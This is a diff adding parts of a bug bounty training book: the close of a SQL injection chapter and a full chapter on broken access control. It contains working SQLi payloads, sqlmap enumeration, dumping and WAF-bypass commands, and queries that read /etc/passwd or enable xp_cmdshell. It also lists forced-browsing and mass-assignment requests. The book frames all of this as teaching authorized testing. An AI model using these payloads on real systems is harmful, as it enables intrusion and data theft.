+### Type 6: Second-Order (Stored) SQLi
+
+The input is stored safely in the database initially (properly escaped), but later retrieved and used unsafely in another query — without re-sanitization.
+
+```
+Step 1: Register with username: admin'--
+         Application safely inserts: INSERT INTO users (username) VALUES ('admin''--')
+
+Step 2: When the application later uses your stored username in another query:
+         UPDATE users SET password='newpass' WHERE username='admin'--'
+         The '--' comments out the rest — affecting the admin account instead of yours
+```
+
+**Testing for second-order:**
+
+1. Register or create an account with SQL metacharacters in the username/name
+2. Find every place the stored value is subsequently used (profile pages, password change, account merge)
+3. Observe whether the metacharacters cause database errors or behavioral differences in those later operations
+
+---
+
+## Using sqlmap
+
+sqlmap automates detection and exploitation of SQL injection. It is powerful but must be used responsibly.
+
+**Important:** Always use sqlmap with a low request rate on live targets. Obtain a session cookie for authenticated testing. Never run `--dump-all` on production databases — stop after confirming the vulnerability.
+
+### Basic Usage
+
+```bash
+# Test a GET parameter
+sqlmap -u "https://example.com/products?id=1"
+
+# Test a specific parameter
+sqlmap -u "https://example.com/products?id=1&category=shoes" -p id
+
+# Test a POST request (use Burp "Save item" to get the raw request file)
+sqlmap -r request.txt
+
+# Test with session cookie (authenticated testing)
+sqlmap -u "https://example.com/profile?id=1" \
+  --cookie="session=abc123def456"
+
+# Test a JSON parameter
+sqlmap -u "https://api.example.com/users" \
+  --data='{"id": "1"}' \
+  --method=POST \
+  --headers="Content-Type: application/json"
+```
+
+### Specifying the DBMS
+
+```bash
+# If you already know the DBMS (speeds up testing)
+sqlmap -u "https://example.com/id=1" --dbms=mysql
+sqlmap -u "https://example.com/id=1" --dbms=postgresql
+sqlmap -u "https://example.com/id=1" --dbms=mssql
+```
+
+### Enumerating Database Structure
+
+```bash
+# Get current database name
+sqlmap -u "https://example.com/id=1" --current-db
+
+# List all databases
+sqlmap -u "https://example.com/id=1" --dbs
+
+# List tables in a specific database
+sqlmap -u "https://example.com/id=1" -D target_db --tables
+
+# List columns in a specific table
+sqlmap -u "https://example.com/id=1" -D target_db -T users --columns
+
+# Dump specific columns (for proof of concept — stop here in bug bounty)
+sqlmap -u "https://example.com/id=1" -D target_db -T users -C "username,email" --dump
+# Dump ONLY enough to prove the vulnerability. Never dump the entire database.
+```
+
+### Bypass Techniques
+
+```bash
+# Use tamper scripts to bypass WAFs and filters
+sqlmap -u "https://example.com/id=1" --tamper=space2comment
+
+# Common tamper scripts
+# space2comment     → replaces spaces with /**/ (bypass WAF space filters)
+# between           → replaces > with BETWEEN x AND y
+# randomcase        → randomly changes case: SeLeCt InStEaD oF SELECT
+# charencode        → URL-encodes characters
+# base64encode      → base64-encodes the payload
+# equaltolike       → replaces = with LIKE
+
+# Multiple tampers
+sqlmap -u "https://example.com/id=1" --tamper=space2comment,randomcase
+
+# Adjust level and risk (higher = more aggressive = more detection risk)
+# Level 1-5 (default 1): controls which parameters are tested
+# Risk 1-3 (default 1): controls which payloads are tried (3 may modify data)
+sqlmap -u "https://example.com/id=1" --level=3 --risk=2
+
+# Set custom delay to avoid rate limiting
+sqlmap -u "https://example.com/id=1" --delay=2
+
+# Route through Burp for monitoring
+sqlmap -u "https://example.com/id=1" --proxy=http://127.0.0.1:8080
+```
+
+---
+
+## Common Payloads Reference
+
+### MySQL
+
+```sql
+-- Version
+SELECT version()
+SELECT @@version
+
+-- Current database
+SELECT database()
+
+-- List databases
+SELECT group_concat(schema_name) FROM information_schema.schemata
+
+-- List tables
+SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
+
+-- List columns
+SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'
+
+-- Dump data
+SELECT concat(username,':',password) FROM users
+
+-- Read a file (requires FILE privilege)
+SELECT LOAD_FILE('/etc/passwd')
+
+-- Comment syntax
+--       (space after required in some contexts)
+#        (alternative for MySQL)
+/**/     (C-style comment)
+```
+
+### PostgreSQL
+
+```sql
+-- Version
+SELECT version()
+
+-- Current database
+SELECT current_database()
+
+-- List databases
+SELECT string_agg(datname,',') FROM pg_database
+
+-- List tables
+SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'
+
+-- List columns
+SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'
+
+-- Dump data
+SELECT username||':'||password FROM users
+
+-- Read a file (superuser only)
+SELECT pg_read_file('/etc/passwd')
+
+-- Time-based
+SELECT pg_sleep(5)
+
+-- Comment
+--       (double dash + space)
+```
+
+### Microsoft SQL Server
+
+```sql
+-- Version
+SELECT @@version
+
+-- Current database
+SELECT DB_NAME()
+
+-- List databases
+SELECT STRING_AGG(name,',') FROM master.dbo.sysdatabases
+
+-- List tables
+SELECT STRING_AGG(table_name,',') FROM information_schema.tables
+
+-- List columns
+SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='users'
+
+-- Time-based delay
+WAITFOR DELAY '0:0:5'
+
+-- Enable xp_cmdshell (requires sysadmin — very high privilege)
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+
+---
+
+## Demonstrating Impact
+
+In bug bounty, the goal is to prove the vulnerability exists without causing harm or extracting real user data.
+
+**Appropriate proof of concept:**
+
+```sql
+-- Show database version (proves code execution, no data exposure)
+' UNION SELECT NULL,version(),NULL--
+
+-- Show current database name
+' UNION SELECT NULL,database(),NULL--
+
+-- Show the number of tables (proves access without reading data)
+' UNION SELECT NULL,(SELECT count(*) FROM information_schema.tables WHERE table_schema=database()),NULL--
+
+-- Show table names (structural metadata — not personal data)
+' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+```
+
+**Stop before:**
+
+- Dumping actual usernames, emails, or passwords
+- Reading files from the server
+- Writing files to the server
+- Executing OS commands (even via stacked queries)
+
+**For your bug report:**
+
+1. The vulnerable URL and parameter
+2. The exact payload used
+3. The response showing database metadata (version, database name, table count)
+4. The estimated impact (how many records are at risk, what types of data)
+5. The DBMS identified
+
+---
+
+## Filter and WAF Bypass Techniques
+
+When basic payloads are blocked:
+
+```sql
+-- Case variation (SQL keywords are case-insensitive)
+sElEcT vErSiOn()
+UNION/**/SELECT/**/version()
+
+-- Comment-based obfuscation
+UN/**/ION SE/**/LECT version()
+/*!UNION*/ /*!SELECT*/ version()
+
+-- URL encoding
+%27 = '
+%20 = space
+%23 = #
+
+-- Double URL encoding (if the WAF decodes once)
+%2527 = %27 = '
+
+-- Whitespace alternatives
+UNION%09SELECT    (tab instead of space)
+UNION%0ASELECT    (newline)
+UNION%0DSELECT    (carriage return)
+
+-- Keyword alternatives
+-- INFORMATION_SCHEMA alternatives in MySQL:
+-- sys.schema_tables
+-- mysql.innodb_table_stats
+
+-- If SLEEP is blocked (MySQL alternatives):
+BENCHMARK(10000000,MD5('test'))
+```
+
+---
+
+## Second-Order Testing Checklist
+
+Second-order injection is easy to miss. After finding standard injection is blocked or not present:
+
+1. Register an account with a SQLi payload as the username: `admin'--`
+2. Log in as that account
+3. Visit every feature that uses your username server-side:
+    - Profile page
+    - Password change ("WHERE username = YOUR_STORED_VALUE")
+    - Account deletion
+    - Admin user lookup (if admin can search by username)
+4. Look for errors or behavioral differences that indicate the stored payload is now executing
+
+---
+
+## Summary
+
+SQL injection allows attackers to manipulate database queries by injecting SQL code into user-controlled input. It occurs when applications concatenate user input directly into SQL strings without parameterization. The five main types are error-based, union-based, boolean-based blind, time-based blind, and out-of-band. Union-based is the most efficient when available. Boolean-based and time-based work when no output is returned. sqlmap automates detection and enumeration — but must be rate-limited and stopped at structural metadata in bug bounty contexts. Second-order injection is a commonly missed variant where stored data is used unsafely later. SQLi severity is typically Critical when it provides unauthenticated access to user data.
+
+---
+
+## Checklist
+
+- [ ] Identified all URL parameters, POST body fields, headers, and JSON values that interact with the database
+- [ ] Sent a single quote `'` to each parameter — noted any SQL errors or behavioral changes
+- [ ] Tested boolean-based detection: `AND 1=1` vs `AND 1=2` — noted response differences
+- [ ] Tested time-based detection: `AND SLEEP(5)` — measured response delay
+- [ ] Determined the injection type (error-based, union, boolean-blind, time-blind)
+- [ ] Identified the number of columns using `ORDER BY` or `UNION SELECT NULL` padding
+- [ ] Identified which columns are displayed using string markers (`'TEST'`)
+- [ ] Extracted the DBMS version and database name
+- [ ] Listed table names from information_schema (structural data only)
+- [ ] Stopped extraction at structural metadata — did not dump actual user data
+- [ ] Ran sqlmap with a session cookie for authenticated endpoints
+- [ ] Used `--delay` or `--level 1` to avoid aggressive scanning
+- [ ] Tested search fields, sort parameters, and filter dropdowns (commonly overlooked)
+- [ ] Checked for second-order injection in stored profile fields
+- [ ] Tested HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For` (if reflected into queries)
+- [ ] Documented the vulnerable parameter, payload, DBMS, and database name in the report
+- [ ] Did not execute OS commands or read server files without explicit program permission
+
+---
+
+# Chapter 17: Broken Access Control
+
+## Objective
+
+Understand what access control is, why it fails, and how to systematically identify and exploit broken access control vulnerabilities — one of the most consistently prevalent vulnerability classes across all web applications.
+
+## Prerequisites
+
+Chapters 1–16 complete. You should be comfortable navigating web applications in Burp Suite, understanding HTTP requests and responses, and reading basic application logic.
+
+## Terminology
+
+|Term|Definition|
+|---|---|
+|**Access Control**|Rules that determine which users can access which resources or perform which actions|
+|**Authorization**|The process of verifying that a user has permission to perform an action (distinct from authentication, which verifies _who_ they are)|
+|**IDOR**|Insecure Direct Object Reference — a subtype where object identifiers can be manipulated to access unauthorized resources|
+|**Horizontal Privilege Escalation**|Accessing another user's resources at the same privilege level (e.g., user A accessing user B's data)|
+|**Vertical Privilege Escalation**|Gaining higher privileges than you are authorized for (e.g., a regular user accessing admin functions)|
+|**Forced Browsing**|Directly navigating to URLs or endpoints that are not linked in the UI but exist on the server|
+|**RBAC**|Role-Based Access Control — a model where access is granted based on a user's role|
+|**Parameter Tampering**|Modifying request parameters to gain unauthorized access|
+|**Mass Assignment**|A vulnerability where a server accepts user-supplied fields that should not be user-controllable (e.g., `role`, `isAdmin`)|
+
+---
+
+## Theory
+
+### What Is Access Control?
+
+Access control is the set of rules and mechanisms a web application uses to enforce what users can do and what data they can see. Every web application has at minimum two levels of access: unauthenticated (not logged in) and authenticated (logged in). Most have many more: regular user, premium user, moderator, admin, super-admin, and so on.
+
+Access control is how the application ensures that:
+
+- Users can only see their own data, not other users' data
+- Regular users cannot access admin panels
+- Read-only users cannot delete records
+- Unauthenticated visitors cannot access content behind a login wall
+
+When access control is broken, these guarantees fail. An attacker can see data that is not theirs, perform actions they are not authorized to perform, or elevate their privileges.
+
+### Why Does Access Control Break?
+
+Access control failures are **#1 in the OWASP Top 10** — not because they are technically complex, but because they are easy to get wrong at scale.
+
+A web application might have hundreds of endpoints. Developers must implement correct authorization checks on every single one. Missing even one creates a vulnerability. Common reasons access control fails:
+
+1. **Developers trust the UI.** They hide a "Delete User" button from non-admins but forget to protect the API endpoint the button calls. An attacker simply calls the endpoint directly.
+2. **Enforcement is done client-side.** JavaScript hides admin features, but the server does not verify the user's role — it just serves whatever is requested.
+3. **Object references are predictable.** User accounts are at `/account/1001`, `/account/1002`, etc. There is no check that the authenticated user owns the account they are requesting.
+4. **Developers forget about indirect paths.** The main `/admin` route checks for admin role. But `/admin/export` was added later and the check was forgotten.
+5. **HTTP methods are not locked down.** The application correctly refuses a `DELETE` request from a regular user but does not account for the fact that a `POST` to the same endpoint achieves the same effect.
+
+### The Two Types of Broken Access Control
+
+#### Horizontal Privilege Escalation
+
+Accessing resources that belong to another user at the _same_ privilege level.
+
+**Example:** You are logged in as User A. You can view your own profile at `/profile?id=4521`. You change the `id` parameter to `4522` and see User B's private profile. Both users have the same role (regular user), but you accessed data you were not authorized to access.
+
+This is the classic IDOR pattern (covered in depth in Chapter 20). However, IDOR is a specific subtype of broken access control. Horizontal escalation includes many more scenarios than just object ID manipulation.
+
+#### Vertical Privilege Escalation
+
+Gaining access to functions or data reserved for higher-privilege roles.
+
+**Example:** You are a regular user. The admin panel is at `/admin/dashboard`. You navigate directly to it and — because the server does not verify your role — you are shown the full admin interface.
+
+### Access Control in Real Applications
+
+Real applications enforce access control in several ways. Understanding these is essential to knowing where to look for failures.
+
+**Route-Level Middleware**
+
+Frameworks like Express (Node.js), Django (Python), and Laravel (PHP) let developers attach middleware to routes. The middleware runs before the route handler and checks the user's authentication and role.
+
+```
+GET /admin/users
+  → run isAuthenticated() middleware → run isAdmin() middleware → handle request
+```
+
+If the middleware is missing from a route, the check never runs.
+
+**Object-Level Authorization**
+
+When a user requests a specific object (a document, an order, a message), the application should verify that the user owns or has permission to access that object.
+
+```
+GET /api/orders/8841
+  → verify user is authenticated
+  → verify order 8841 belongs to this user
+  → return order
+```
+
+If step 2 is missing, any authenticated user can access any order.
+
+**Function-Level Authorization**
+
+Before executing a sensitive action (delete a user, change a role, export data), the application should verify the user has permission to perform that specific action.
+
+```
+POST /api/users/4521/delete
+  → verify user is authenticated
+  → verify user has DELETE_USER permission
+  → execute deletion
+```
+
+If step 2 is missing, any authenticated user can delete any user.
+
+---
+
+## How to Test for Broken Access Control
+
+### Step 1: Map the Application's Access Control Model
+
+Before you start attacking, understand how the application is supposed to work. Ask yourself:
+
+- What roles exist? (guest, user, admin, moderator, etc.)
+- What can each role do?
+- What data is private to each user?
+- What actions are restricted to admins?
+
+You can learn this by reading the program's feature documentation, exploring the UI as multiple user types, and observing every request Burp Suite captures.
+
+### Step 2: Create Multiple Test Accounts
+
+You need at least two accounts at each privilege level to test properly.
+
+- **Account A** (regular user): your primary testing account
+- **Account B** (regular user): your victim account — to test horizontal escalation
+- **Account C** (admin, if available): to understand what admin functions look like
+
+Some programs provide a test admin account. If not, you can often infer admin functionality from JavaScript files, API documentation, or HTML source comments.
+
+### Step 3: Test Unauthenticated Access
+
+Log out completely. Attempt to access every endpoint you discovered while authenticated. Use Burp's session handling rules or compare responses with and without a valid session cookie.
+
+Common places to find unauthenticated access bugs:
+
+- API endpoints (especially `/api/v1/...` routes)
+- Static files that should be private (e.g., `/reports/quarterly-financials.pdf`)
+- Admin functions on alternate ports or subdomains
+- Password reset flows that expose tokens in responses
+- Webhook or callback endpoints
+
+### Step 4: Test Horizontal Privilege Escalation
+
+Logged in as Account A, systematically replace your user identifiers with Account B's identifiers in every request.
+
+**Identifiers to look for:**
+
+- User ID in the URL: `/profile/4521` → try `/profile/4522`
+- User ID in parameters: `?user_id=4521` → try `?user_id=4522`
+- User ID in the request body: `{"userId": "4521"}` → try `{"userId": "4522"}`
+- Object IDs belonging to the user: order IDs, document IDs, message IDs, ticket IDs
+
+**What to test for each:**
+
+- Can you read Account B's private data?
+- Can you modify Account B's data?
+- Can you delete Account B's data?
+- Can you perform actions on Account B's behalf?
+
+### Step 5: Test Vertical Privilege Escalation
+
+Logged in as a regular user, attempt to access admin or elevated functionality.
+
+**Forced browsing — admin routes to try:**
+
+```
+/admin
+/admin/dashboard
+/admin/users
+/admin/settings
+/admin/logs
+/admin/export
+/administrator
+/manage
+/management
+/console
+/control
+/panel
+/superadmin
+/moderator
+/staff
+/internal
+```
+
+These are often protected by login checks but not by role checks. If you are authenticated as any user, the server may serve the admin panel.
+
+**API endpoint testing:**
+
+Admin actions are often exposed via API endpoints. Look for these in JavaScript files, network requests captured in Burp, and API documentation:
+
+```
+GET  /api/admin/users
+POST /api/admin/users/delete
+GET  /api/users?role=admin
+POST /api/roles/assign
+GET  /api/internal/debug
+DELETE /api/users/{id}
+```
+
+Try calling these endpoints with your regular user's session token. A 200 response when you expected a 403 is a vulnerability.
+
+**Parameter-based role escalation (Mass Assignment):**
+
+Some poorly designed applications include role information in the request itself:
+
+```http
+POST /api/profile/update
+Content-Type: application/json
+
+{"username": "alice", "email": "alice@example.com", "role": "user"}
+```
+
+Try changing `"role": "user"` to `"role": "admin"` and observe whether the server accepts the change. Also try adding fields that were not in the original request:
+
+```json
+{"username": "alice", "email": "alice@example.com", "isAdmin": true, "verified": true}
+```
+
+### Step 6: Test HTTP Method Substitution
+
+Many frameworks apply access control based on both the route AND the HTTP method. If the control is only implemented for some methods, other methods may bypass it.
+
+Test every protected endpoint with alternate HTTP methods:
+
+```
+# Original (blocked):
+DELETE /api/users/4522
+
+# Try these alternatives:
+GET    /api/users/4522/delete
+POST   /api/users/4522/delete
+PUT    /api/users/4522
+PATCH  /api/users/4522
+```
+
+Also test with uncommon but valid HTTP methods:
+
+```
+HEAD    /admin/users
+OPTIONS /admin/users
+TRACE   /admin/users
+```
+
+### Step 7: Test Path Traversal in Routes
+
+Some frameworks match routes with patterns. If the pattern is too permissive, you can bypass access checks with path manipulation:
+
+```
+# Blocked:
+/admin/users
+
+# Try these variations:
+/admin/users/
+/admin//users
+/ADMIN/users
+/Admin/Users
+/admin/./users
+/admin/%2fusers
+/admin/users%20
+/admin;/users
+```
+
+### Step 8: Test Multi-Step Workflows
+
+Access control must be enforced at every step of a multi-step process — not just the first one.
+
+Example — an e-commerce checkout flow:
+
+1. Add items to cart
+2. Enter shipping information
+3. Enter payment information
+4. Confirm order
+
+If access control is only checked at step 1, you can reach step 3 by navigating directly to it, potentially accessing payment processing functionality without proper authorization.
+
+**Test by:**
+
+- Starting a multi-step process and capturing the URL or request for each step
+- Attempting to skip to later steps directly without completing earlier ones
+- Attempting to access another user's in-progress workflow using their object ID
+
+---
+
+## Common Vulnerability Patterns
+
+### Pattern 1: Missing Function-Level Access Control
+
+The UI hides a button. The server does not check the user's role when the corresponding API endpoint is called.
+
+**How to find it:** Look at every API call made when you perform an action as an admin. Then replay those API calls using a regular user's session token.
+
+### Pattern 2: GUID vs. Sequential ID
+
+Applications sometimes use GUIDs (e.g., `a3f2c891-44f1-4b9e-bcc3-12ef44ac2f71`) instead of sequential integers, believing these are impossible to guess. This does not make the endpoint secure — it only makes it harder to enumerate.
+
+**How to find it:** Capture GUIDs from API responses (e.g., another user's GUID appearing in a shared resource or notification). Then use that GUID to access the resource directly.
+
+### Pattern 3: Referrer-Based Access Control
+
+Some applications check the `Referer` header to determine if a user navigated through the proper flow. This is trivially bypassable.
+
+```http
+GET /admin/users HTTP/1.1
+Host: target.com
+Referer: https://target.com/admin/dashboard
+Cookie: session=regularuser_token
+```
+
+**How to find it:** Add a `Referer` header matching an admin URL when accessing a protected endpoint as a regular user.
+
+### Pattern 4: Cookie or Parameter Contains Role
+
+The role is stored in a client-controlled location (cookie, hidden form field, JWT without proper signing).
+
+```
+Cookie: role=user; session=abc123
+```
+
+**How to find it:** Look for any cookie, header, or parameter that contains a role or privilege indicator. Attempt to modify it.
+
+### Pattern 5: API v1 vs v2 Discrepancy
+
+The application upgraded from v1 to v2 and added access controls to v2 endpoints. The v1 endpoints still exist and lack controls.
+
+```
+# v2 — protected:
+GET /api/v2/users/4522/profile → 403 Forbidden
+
+# v1 — unprotected:
+GET /api/v1/users/4522/profile → 200 OK (full profile returned)
+```
+
+**How to find it:** For every endpoint you find, try alternate version prefixes: `/v1/`, `/v2/`, `/v0/`, `/legacy/`, `/old/`.
+
+---
+
+## Exploitation Examples
+
+### Example 1: Accessing Another User's Invoice
+
+**Setup:** You are logged in as user 4521. You requested your own invoice:
+
+```http
+GET /api/invoices/88413 HTTP/1.1
+Host: target.com
+Cookie: session=USER_4521_TOKEN
+```
+
+**Test:** Replace `88413` with invoice IDs belonging to other users. Find these IDs by observing your own invoice IDs (sequential integers suggest others exist), checking email notifications that may contain invoice numbers, or enumerating.
+
+**Vulnerability confirmed:** The server returns invoice data for another user without checking that the requesting user owns that invoice.
+
+### Example 2: Admin Panel Access via Forced Browsing
+
+**Setup:** You are logged in as a regular user. The admin dashboard is at `/admin`.
+
+**Test:**
+
+```http
+GET /admin/users HTTP/1.1
+Host: target.com
+Cookie: session=REGULAR_USER_TOKEN
+```
+
+**Vulnerability confirmed:** The server returns the admin user management page instead of returning a 403 Forbidden response.
+
+### Example 3: Privilege Escalation via Mass Assignment
+
+**Setup:** The profile update endpoint is:
+
+```http
+POST /api/profile HTTP/1.1
+Content-Type: application/json
+Cookie: session=REGULAR_USER_TOKEN
+
+{"display_name": "Alice"}
+```
+
+**Test:** Add extra fields:
+
+```http
+POST /api/profile HTTP/1.1
+Content-Type: application/json
+Cookie: session=REGULAR_USER_TOKEN
+
+{"display_name": "Alice", "role": "admin", "is_verified": true, "account_type": "premium"}
+```
+
+**Vulnerability confirmed:** The server accepts the `role` field and updates the user's role to admin.
+
+---
+
+## Burp Suite Workflow
+
+### Setting Up Multi-Account Testing
+
+1. Open Burp Suite → Proxy → Options
+2. Enable **"Match and Replace"** to quickly swap session tokens
+3. Alternatively, use **Burp's Session Handling Rules** to maintain two separate sessions simultaneously
+
+### Using Burp Repeater for Access Control Testing
+
+1. Capture a request in Proxy
+2. Send to Repeater (Ctrl+R)
+3. Modify the session cookie to Account B's token
+4. Observe the response — a 200 with data when you expected a 403 is a finding
+
+### Using Burp Intruder for Enumeration
+
+1. Capture a request to a resource endpoint: `GET /api/documents/§1001§`
+2. Send to Intruder
+3. Set the payload to a sequential number list (1000–2000)
+4. Run the attack
+5. Filter results by response length — resources you own will have one response length, unauthorized ones (if the access control is broken) will have another
+
+---
+
+## Impact Assessment
+
+Broken access control can range from low to critical severity depending on what data or functionality is exposed.
+
+|Scenario|Typical Severity|
+|---|---|
+|Reading another user's non-sensitive public profile|Low|
+|Reading another user's private messages|High|
+|Reading another user's financial data|High to Critical|
+|Accessing admin panel (read-only)|High|
+|Accessing admin panel (write/delete)|Critical|
+|Deleting or modifying all user data|Critical|
+|Account takeover via access control|Critical|
+
+When writing your report, always demonstrate the _worst-case impact_ a real attacker could achieve, not just what you tested.
+
+---
+
+## Practice Labs
+
+1. **PortSwigger Web Security Academy** — Access Control Labs: practitioner.portswigger.net/web-security/access-control. Complete all labs in this module. They are among the best hands-on exercises for this topic.
+2. **DVWA (Damn Vulnerable Web Application)** — set up locally and practice the IDOR and access control exercises at different difficulty levels.
+3. **HackTheBox** — search for retired machines tagged with "access control" or "IDOR" to practice in a realistic environment.
+
+---
+
+## References
+
+- OWASP Top 10 A01: Broken Access Control — owasp.org/Top10/A01_2021-Broken_Access_Control
+- OWASP Testing Guide — Access Control Testing — owasp.org/www-project-web-security-testing-guide
+- PortSwigger Access Control Labs — portswigger.net/web-security/access-control
+- HackerOne Hacktivity — search "IDOR" and "access control" for real disclosed reports
+
+---
+
+## Summary
+
+Broken access control occurs when an application fails to properly enforce what authenticated users are allowed to do and access. It is the single most common vulnerability class in web applications and is consistently ranked #1 by OWASP.
+
+There are two primary categories: horizontal privilege escalation (accessing another user's data at the same privilege level) and vertical privilege escalation (accessing functionality reserved for higher-privilege roles). Testing requires multiple accounts, systematic enumeration of endpoints, parameter tampering, HTTP method substitution, forced browsing of admin routes, and attention to multi-step workflow logic.
+
+The impact ranges from minor (reading public profile fields) to critical (admin panel takeover, mass data exfiltration, or complete account compromise).
+
+---
+
+## Checklist
+
+- [ ] Created at least two regular user accounts and one admin account (if available) for testing
+- [ ] Mapped the application's intended access control model (roles and permissions)
+- [ ] Tested all endpoints for unauthenticated access (logged-out session)
+- [ ] Tested horizontal escalation: replaced own object IDs with other users' IDs across all endpoints
+- [ ] Tested vertical escalation: attempted to access admin routes and API endpoints as a regular user
+- [ ] Tested HTTP method substitution on all protected endpoints
+- [ ] Tested for mass assignment: added extra fields (role, isAdmin) to all write requests
+- [ ] Tested for API version discrepancies (v1 vs v2 endpoint sets)
+- [ ] Tested multi-step workflows for step-skipping and cross-user access
+- [ ] Tested path normalization bypasses on protected routes
+- [ ] Documented any confirmed finding with a full reproduction path and impact statement
+
+---
+
+> _"Access control is only as strong as the endpoint with the missing check."_ — Field Wisdom
+
+---
 # Chapter 18: Authentication Vulnerabilities
 
 ## Objective
